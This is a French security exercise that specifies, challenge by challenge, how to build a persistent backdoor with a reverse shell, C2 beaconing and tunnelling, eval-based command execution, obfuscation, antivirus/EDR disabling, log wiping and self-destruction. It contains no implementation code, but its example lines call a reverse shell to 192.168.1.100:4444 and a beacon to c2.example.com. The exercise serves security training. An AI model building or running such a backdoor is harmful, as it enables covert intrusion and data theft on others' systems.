EXERCICE 22: BACKDOOR PERSISTANT
================================

AVERTISSEMENT CRITIQUE:
Cet exercice contient des techniques qui sont ILLÉGALES sans autorisation explicite.
Usage STRICTEMENT ÉDUCATIF dans des environnements de test isolés UNIQUEMENT.

Objectif:
---------
Implémenter un système de backdoor avec mécanismes de persistance, communication C2,
et exécution de commandes à distance. Comprendre ces techniques pour mieux les détecter
et s'en défendre.

Défis à Implémenter:
--------------------

1. SIMPLE REVERSE SHELL
   - Créer une connexion socket reverse vers un serveur C2
   - Permettre l'exécution de commandes shell à distance
   - Gérer stdin/stdout/stderr correctement
   - Reconnexion automatique en cas de déconnexion
   Input: IP et port du serveur C2
   Output: Shell interactif distant

2. MÉCANISME DE PERSISTANCE
   - Détecter le système d'exploitation (Windows/Linux/macOS)
   - Implémenter l'auto-démarrage approprié:
```python
     * Windows: Registry Run key
     * Linux: Cron job ou systemd service
     * macOS: Launch Agent
```
   - Copier l'exécutable dans un emplacement discret
   - Vérifier et réparer la persistance périodiquement
   Input: Aucun
   Output: Confirmation de l'installation de persistance

3. HTTP BEACONING
   - Implémenter un système de beacon HTTP/HTTPS
   - Envoyer des heartbeats réguliers au C2
   - Récupérer des commandes depuis le serveur
   - Exfiltrer les résultats d'exécution
   - Utiliser des intervalles aléatoires (jitter)
   Input: URL du serveur C2, intervalle de beacon
   Output: Communication bidirectionnelle HTTP

4. COMMAND EXECUTION ENGINE
   - Implémenter différents types d'exécution:
```python
     * Shell commands (subprocess)
     * Python code execution (eval/exec)
     * File operations (upload/download)
     * System information gathering
```
   - Parser les commandes reçues du C2
   - Encoder les résultats pour transmission
   - Gestion d'erreurs robuste
   Input: Commande du C2 (format: TYPE:PAYLOAD)
   Output: Résultat d'exécution encodé

5. OBFUSCATION BASIQUE
   - Encoder les strings sensibles (URLs, IPs, chemins)
   - Utiliser XOR ou Base64 pour obfuscation
   - Masquer les imports suspects
   - Randomiser les noms de fonctions/variables
   - Anti-debug: détecter debuggers et VMs
   Input: Code source du backdoor
   Output: Version obfusquée

6. MULTI-HANDLER C2
   - Implémenter plusieurs méthodes de communication:
```python
     * Primary: HTTP/HTTPS
     * Fallback 1: DNS tunneling
     * Fallback 2: ICMP tunneling
     * Fallback 3: Raw sockets
```
   - Basculer automatiquement si une méthode échoue
   - Tester la connectivité avant basculement
   Input: Liste de handlers C2 avec priorités
   Output: Communication via handler disponible

7. STEALTH ET EVASION
   - Process hollowing ou injection
   - Masquer le processus dans la liste des processus
   - Nettoyer les logs et traces
   - Désactiver les antivirus/EDR (démonstration concept)
   - Techniques anti-forensics basiques
   Input: Aucun
   Output: Backdoor furtif et difficile à détecter

8. KILL SWITCH ET AUTO-DESTRUCTION
   - Implémenter une commande de kill switch
   - Supprimer tous les mécanismes de persistance
   - Effacer les traces du backdoor
   - Auto-destruction sur certaines conditions:
```python
     * Détection de debugger
     * Détection de VM/Sandbox
     * Date d'expiration dépassée
```
   Input: Signal de kill switch ou condition trigger
   Output: Suppression complète du backdoor

Exemples d'Utilisation:
-----------------------

# Défi 1: Reverse Shell
python main.py reverse-shell --host 192.168.1.100 --port 4444

# Défi 2: Installation Persistance
python main.py install-persistence

# Défi 3: HTTP Beacon
python main.py beacon --url https://c2.example.com/api --interval 300

# Défi 4: Execution Engine
# Côté C2, envoyer: "SHELL:whoami" ou "PYTHON:import os; print(os.getcwd())"

# Défi 5: Obfuscation
python main.py obfuscate --input backdoor.py --output backdoor_obf.py

# Défi 6: Multi-Handler
python main.py multi-c2 --config c2_handlers.json

# Défi 7: Stealth Mode
python main.py stealth --hide-process --clean-logs

# Défi 8: Auto-Destruction
python main.py self-destruct --remove-all

Contraintes:
------------
1. Environnement de test ISOLÉ obligatoire
2. Ne JAMAIS déployer sur systèmes de production
3. Documenter toutes les actions pour auditabilité
4. Implémenter des mécanismes de sécurité (passwords, encryption)
5. Code commenté en FRANÇAIS
6. Gestion d'erreurs complète
7. Logging des activités (local, pour analyse)
8. Respecter les lois et réglementations en vigueur

Tests de Validation:
--------------------
1. Reverse shell fonctionne et se reconnecte
2. Persistance survit au redémarrage système
3. Beacon communique avec intervalles aléatoires
4. Toutes les commandes s'exécutent correctement
5. Obfuscation rend l'analyse statique difficile
6. Fallback C2 fonctionne si primary échoue
7. Processus difficile à détecter
8. Auto-destruction complète sans traces

Ressources:
-----------
- MITRE ATT&CK: Persistence Techniques
- Python socket programming
- OS-specific persistence mechanisms
- C2 frameworks (Metasploit, Empire, Covenant)
- Obfuscation et packing tools
- Anti-forensics techniques

Notes Importantes:
------------------
- TOUJOURS obtenir autorisation écrite avant tests
- Utiliser UNIQUEMENT dans cadre légal (pentest, CTF, lab)
- Documenter et rapporter toutes les vulnérabilités trouvées
- Nettoyer COMPLÈTEMENT après tests
- Ces techniques sont pour DÉFENSE, pas ATTAQUE
- La connaissance de l'attaque améliore la défense

RAPPEL FINAL:
L'utilisation malveillante de ces techniques est ILLÉGALE et CONTRAIRE À L'ÉTHIQUE.
Cet exercice est destiné aux professionnels de la sécurité et chercheurs dans un
cadre strictement légal et éthique.
